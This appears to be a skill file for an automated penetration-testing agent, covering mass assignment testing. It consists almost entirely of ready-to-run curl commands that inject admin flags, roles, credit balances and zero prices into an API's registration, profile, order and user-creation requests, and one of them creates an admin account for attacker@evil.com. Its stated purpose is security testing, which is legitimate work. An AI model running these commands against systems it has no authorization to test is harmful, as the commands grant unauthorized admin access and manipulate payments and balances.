---
name: vuln-mass-assignment
description: "Mass assignment vulnerability testing — injecting extra parameters to elevate privileges, bypass access control, assign roles/admin flags via API body. Triggers: 'mass assignment', 'auto-binding', 'parameter binding', 'role assignment bypass', 'privilege via api body', 'hidden parameter', 'admin flag injection', 'json parameter injection'."
---

# Mass Assignment Testing

Inject unexpected parameters into API requests to elevate privileges or modify protected fields.

---

## Phase 1: Identify Protected Fields

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

# Check what fields are returned in GET (discover protected/internal fields):
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/profile" | jq .
# Look for: is_admin, role, credits, balance, subscription, verified, email_verified

# Check registration response for extra fields:
curl -s -X POST "$TARGET/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"Test1234!"}' | jq .

# Look at update endpoint response for protected fields:
curl -s -X PUT "$TARGET/api/v1/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","bio":"test bio"}' | jq .
```

---

## Phase 2: Inject Extra Parameters

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

# Inject admin/role fields into registration:
curl -s -X POST "$TARGET/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","email":"test@test.com","password":"Test1234!","is_admin":true,"role":"admin","credits":9999,"subscription":"premium"}'

# Inject into profile update:
curl -s -X PUT "$TARGET/api/v1/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"test","is_admin":true,"role":"admin","plan":"enterprise","balance":10000}'

# Check if fields were accepted:
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/profile" | \
  jq '{is_admin, role, plan, balance, credits}'

# Inject into order/purchase:
curl -s -X POST "$TARGET/api/v1/orders" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1,"price":0,"discount":100,"total":0}'

# Inject into password reset (add elevated user):
curl -s -X POST "$TARGET/api/v1/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Hacked123!","is_admin":true,"verified":true}'
```

---

## Phase 3: Nested Object Injection

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

# Try nested structure injection:
curl -s -X PUT "$TARGET/api/v1/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user":{"role":"admin","is_admin":true},"profile":{"bio":"test"}}'

# Array injection:
curl -s -X POST "$TARGET/api/v1/team/invite" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","role":"owner"}'

# Form-based mass assignment:
curl -s -X POST "$TARGET/profile/update" \
  -H "Cookie: session=TOKEN" \
  -d "bio=test&is_admin=true&role=admin&credits=9999"
```

---

## Output

Save to `output/`:
- `mass_assignment_poc.txt` — parameters that were accepted
- `mass_assignment_impact.txt` — resulting privilege or data change

## Next Phase

→ `vuln-bfla` for function-level authorization issues
→ `pentest-report` to document findings
